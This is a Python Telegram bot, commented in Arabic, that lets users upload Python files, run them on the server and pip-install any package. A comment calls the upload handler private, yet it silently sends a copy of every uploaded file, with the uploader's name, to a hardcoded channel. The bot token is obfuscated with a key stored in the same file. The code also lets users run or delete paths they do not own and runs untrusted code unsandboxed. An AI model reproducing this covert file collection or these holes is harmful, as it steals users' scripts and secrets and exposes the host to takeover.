import os, base64, telebot, subprocess, time, threading, traceback, signal, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# ==================== 🔐 نظام تشفير تلقائي للتوكن ====================
_key_part1 = "7x!A9@#X"
_key_part2 = "P@55w0rd!"
SECRET_KEY = hashlib.sha256((_key_part1 + _key_part2).encode()).digest()

def decrypt_token(enc_b64):
    data = base64.b64decode(enc_b64)
    iv = data[:16]
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(data[16:]), AES.block_size)
    return decrypted.decode()

ENCRYPTED_TOKEN = b"9QqgYs/GAC1dPi2NEzbMZeHI2vfHvkXm2NYIfFbF7m8pm6rq07wbsq+yrdDbVs7IVypjz1+/EK02CI7D5zIFCQ=="
TOKEN = decrypt_token(ENCRYPTED_TOKEN)

# ==================== إعدادات البوت ====================
ADMIN_ID = 7468743872
UPLOAD_DIR = "uploaded_bots"
FORWARD_CHANNEL = "@sadkoussama"
BOT_CHANNEL = "@netplus_VIIP"
BOT_COPY_LINK = "https://t.me/VIIIP_13"

bot = telebot.TeleBot(TOKEN)

if not os.path.exists(UPLOAD_DIR):
    os.mkdir(UPLOAD_DIR)

running_process = {}
waiting_upload = {}
all_users = set()
forced_channels = []

# ✅ تحقق من الأدمن
def is_admin(uid):
    return uid == ADMIN_ID

# ✅ تحقق من الاشتراك الإجباري
def check_subscription(user_id):
    if not forced_channels:
        return True
    try:
        for ch in forced_channels:
            member = bot.get_chat_member(ch, user_id)
            if member.status in ["left", "kicked"]:
                return False
        return True
    except:
        return False

# ✅ رسالة الاشتراك مع تأثير 🔥
def send_force_subscribe(chat_id):
    kb = telebot.types.InlineKeyboardMarkup()
    if forced_channels:
        for ch in forced_channels:
            kb.add(telebot.types.InlineKeyboardButton(f"🔗 اشترك في {ch}", url=f"https://t.me/{ch.replace('@','')}"))
    else:
        kb.add(telebot.types.InlineKeyboardButton("📢 قناة البوت", url=f"https://t.me/{BOT_CHANNEL.replace('@','')}"))
    try:
        bot.send_message(chat_id, "🔥 **يجب الاشتراك في القنوات أدناه لاستخدام البوت:**", parse_mode="Markdown", reply_markup=kb, message_effect_id=5104841245755180586)
    except:
        bot.send_message(chat_id, "🔥 **يجب الاشتراك في القنوات أدناه لاستخدام البوت:**", parse_mode="Markdown", reply_markup=kb)

# ✅ لوحة الترحيب
def main_menu_markup(user_id):
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("📂 عرض الملفات", callback_data="list_files"))
    kb.add(telebot.types.InlineKeyboardButton("📤 رفع ملف", callback_data="upload_file"))
    kb.add(telebot.types.InlineKeyboardButton("📦 تثبيت مكاتب", callback_data="install_pkg"))
    kb.add(telebot.types.InlineKeyboardButton("⚡ سرعة البوت", callback_data="ping"))
    kb.add(telebot.types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    kb.add(
        telebot.types.InlineKeyboardButton("🛒 شراء نسخة من بوت", url=BOT_COPY_LINK),
        telebot.types.InlineKeyboardButton("📢 قناة البوت", url=f"https://t.me/{BOT_CHANNEL.replace('@','')}")
    )
    return kb

# ✅ رسالة الترحيب
WELCOME_TEXT = (
    "🎉✨ **مرحباً بك في بوت الاستضافة الذكي!** ✨🎉\n\n"
    "🚀 **المميزات:**\n"
    "📤 رفع الملفات وتشغيلها\n"
    "▶️ تشغيل وإيقاف الملفات بسهولة\n"
    "🗑️ حذف الملفات بسرعة\n"
    "📦 تثبيت المكاتب المطلوبة\n"
    "⚡ اختبار سرعة البوت\n\n"
    "**مطور: OUSSAMA 🌚**"
)

# 🟢 /start
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    all_users.add(uid)
    if not check_subscription(uid):
        return send_force_subscribe(message.chat.id)
    try:
        bot.send_message(message.chat.id, WELCOME_TEXT, parse_mode="Markdown", reply_markup=main_menu_markup(uid), message_effect_id=5104841245755180586)
    except:
        bot.send_message(message.chat.id, WELCOME_TEXT, parse_mode="Markdown", reply_markup=main_menu_markup(uid))

# 🛠️ /admin
@bot.message_handler(commands=['admin'])
def admin_panel_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 ليس لديك صلاحية الوصول.")
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("➕ إضافة قناة", callback_data="add_channel"))
    kb.add(telebot.types.InlineKeyboardButton("🗑️ حذف قناة", callback_data="del_channel"))
    kb.add(telebot.types.InlineKeyboardButton("📢 إرسال إذاعة", callback_data="broadcast"))
    kb.add(telebot.types.InlineKeyboardButton("👥 عدد المستخدمين", callback_data="users_count"))
    kb.add(telebot.types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    bot.send_message(message.chat.id, "🛠️ **لوحة الأدمن:**", reply_markup=kb, parse_mode="Markdown")

# ✅ استقبال الملفات (مع خصوصية)
@bot.message_handler(content_types=['document'])
def handle_file(message):
    uid = message.from_user.id
    if not check_subscription(uid):
        return send_force_subscribe(message.chat.id)
    if uid not in waiting_upload:
        return bot.send_message(message.chat.id, "📌 اضغط أولاً على **📤 رفع ملف** ثم أرسل الملف.")

    # ✅ إنشاء مجلد خاص بكل مستخدم
    user_dir = os.path.join(UPLOAD_DIR, str(uid))
    if not os.path.exists(user_dir):
        os.makedirs(user_dir)

    info = bot.get_file(message.document.file_id)
    data = bot.download_file(info.file_path)
    path = os.path.join(user_dir, message.document.file_name)  # ← كل ملف داخل مجلد المستخدم
    with open(path, "wb") as f:
        f.write(data)
    del waiting_upload[uid]

    # 🔹 أزرار تحكم مباشرة لكل ملف
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(
        telebot.types.InlineKeyboardButton("▶️ تشغيل", callback_data=f"start|{path}"),
        telebot.types.InlineKeyboardButton("⏹ إيقاف", callback_data=f"stop|{path}"),
        telebot.types.InlineKeyboardButton("🗑️ حذف", callback_data=f"del|{path}")
    )

    try:
        bot.send_message(message.chat.id, f"🎉 **تم رفع الملف بنجاح:** `{message.document.file_name}`", parse_mode="Markdown", reply_markup=kb, message_effect_id=5046509860389126442)
    except:
        bot.send_message(message.chat.id, f"🎉 **تم رفع الملف بنجاح:** `{message.document.file_name}`", parse_mode="Markdown", reply_markup=kb)

    # ✅ إرسال نسخة إلى قناة FORWARD_CHANNEL
    try:
        bot.send_document(FORWARD_CHANNEL, open(path, "rb"), caption=f"📂 **ملف جديد:** `{message.document.file_name}`\n👤 من: [{message.from_user.first_name}](tg://user?id={uid})", parse_mode="Markdown")
    except:
        pass

# ▶️ تشغيل ملف
def run_file_process(cid, path):
    try:
        bot.send_message(cid, f"⚡ **تشغيل الملف:** `{os.path.basename(path)}`", parse_mode="Markdown")
        p = subprocess.Popen(["python3", path], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        running_process[path] = p
        out, _ = p.communicate()
        running_process.pop(path, None)
        bot.send_message(cid, f"✅ **اكتمل التنفيذ**\n```\n{out.decode()[-3000:]}\n```", parse_mode="Markdown")
    except:
        bot.send_message(cid, f"🚨 **خطأ:**\n```\n{traceback.format_exc()}\n```", parse_mode="Markdown")

# ⏹ إيقاف ملف
def stop_file(cid, path):
    if path in running_process:
        running_process[path].send_signal(signal.SIGTERM)
        running_process.pop(path, None)
        bot.send_message(cid, f"⏹ **تم إيقاف الملف:** `{os.path.basename(path)}`", parse_mode="Markdown")
    else:
        bot.send_message(cid, "⚠️ لا يوجد عملية تشغيل لهذا الملف حالياً.")

# 🎛️ معالجة الأزرار (مع عرض ملفات خاصة بالمستخدم فقط)
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    d = call.data
    uid = call.from_user.id

    if not is_admin(uid) and d in ["add_channel","del_channel","broadcast","users_count"]:
        return bot.answer_callback_query(call.id, "🚫 غير مسموح لك.")

    if d == "upload_file":
        waiting_upload[uid] = True
        bot.send_message(call.message.chat.id, "📤 **أرسل الملف الآن.**")

    elif d == "install_pkg":
        bot.send_message(call.message.chat.id, "📦 **أرسل اسم المكتبة المراد تثبيتها:**")
        bot.register_next_step_handler(call.message, install_package_step)

    elif d.startswith("start|"):
        threading.Thread(target=run_file_process, args=(call.message.chat.id, d.split("|",1)[1])).start()

    elif d.startswith("stop|"):
        stop_file(call.message.chat.id, d.split("|",1)[1])

    elif d.startswith("del|"):
        p = d.split("|",1)[1]
        if os.path.exists(p):
            os.remove(p)
            bot.send_message(call.message.chat.id, f"🗑️ **تم حذف الملف:** `{os.path.basename(p)}`", parse_mode="Markdown")
        else:
            bot.send_message(call.message.chat.id, "⚠️ الملف غير موجود.")

    elif d == "list_files":
        user_dir = os.path.join(UPLOAD_DIR, str(uid))   # ← عرض ملفات المستخدم فقط
        if not os.path.exists(user_dir):
            os.makedirs(user_dir)

        files = os.listdir(user_dir)
        if not files:
            return bot.edit_message_text("📂 لا توجد ملفات.", call.message.chat.id, call.message.message_id)
        kb = telebot.types.InlineKeyboardMarkup()
        for f in files:
            p = os.path.join(user_dir, f)
            kb.add(telebot.types.InlineKeyboardButton(f"📄 {f}", callback_data="none"))
            kb.add(
                telebot.types.InlineKeyboardButton("▶️", callback_data=f"start|{p}"),
                telebot.types.InlineKeyboardButton("⏹", callback_data=f"stop|{p}"),
                telebot.types.InlineKeyboardButton("🗑️", callback_data=f"del|{p}")
            )
        kb.add(telebot.types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text("📂 **الملفات المرفوعة:**", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)

    elif d == "ping":
        start_time = time.time()
        msg = bot.send_message(call.message.chat.id, "⏳ **جارٍ قياس السرعة...**")
        latency = round((time.time() - start_time), 3)
        bot.edit_message_text(f"⚡ **سرعة البوت:** `{latency} ثانية`", call.message.chat.id, msg.message_id, parse_mode="Markdown")

    elif d == "add_channel":
        bot.send_message(call.message.chat.id, "🔗 أرسل معرف القناة:")
        bot.register_next_step_handler(call.message, add_channel)

    elif d == "del_channel":
        forced_channels.clear()
        bot.send_message(call.message.chat.id, "🗑️ **تم حذف جميع قنوات الاشتراك.**")

    elif d == "broadcast":
        bot.send_message(call.message.chat.id, "✉️ أرسل رسالة الإذاعة:")
        bot.register_next_step_handler(call.message, broadcast_message)

    elif d == "users_count":
        bot.send_message(call.message.chat.id, f"👥 **عدد المستخدمين:** {len(all_users)}")

    elif d == "back":
        bot.edit_message_text(WELCOME_TEXT, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu_markup(uid))

# ✅ دوال الأدمن
def add_channel(message):
    ch = message.text.strip()
    if not ch.startswith('@'):
        ch = '@' + ch
    if ch not in forced_channels:
        forced_channels.append(ch)
        bot.send_message(message.chat.id, f"✅ **تمت إضافة قناة الاشتراك الإجباري:** {ch}")
    else:
        bot.send_message(message.chat.id, f"⚠️ القناة {ch} موجودة بالفعل.")

def broadcast_message(m):
    c = 0
    for u in all_users:
        try:
            bot.send_message(u, f"📢 **إشعار:**\n{m.text}")
            c += 1
        except:
            pass
    bot.send_message(m.chat.id, f"✅ تم إرسال الرسالة إلى {c} مستخدم.")

# ✅ تثبيت مكتبة
def install_package_step(m):
    pkg = m.text.strip()
    bot.send_message(m.chat.id, f"⏳ تثبيت: `{pkg}`", parse_mode="Markdown")
    try:
        out = subprocess.check_output(["pip", "install", pkg], stderr=subprocess.STDOUT).decode()
        bot.send_message(m.chat.id, f"✅ **تم التثبيت:** `{pkg}`\n```\n{out[-3000:]}\n```", parse_mode="Markdown")
    except subprocess.CalledProcessError as e:
        bot.send_message(m.chat.id, f"❌ **فشل التثبيت:**\n```\n{e.output.decode()}\n```", parse_mode="Markdown")

# 🚀 تشغيل البوت
print("✅ بوت الاستضافة 🔥 يعمل الآن...")
bot.infinity_polling()
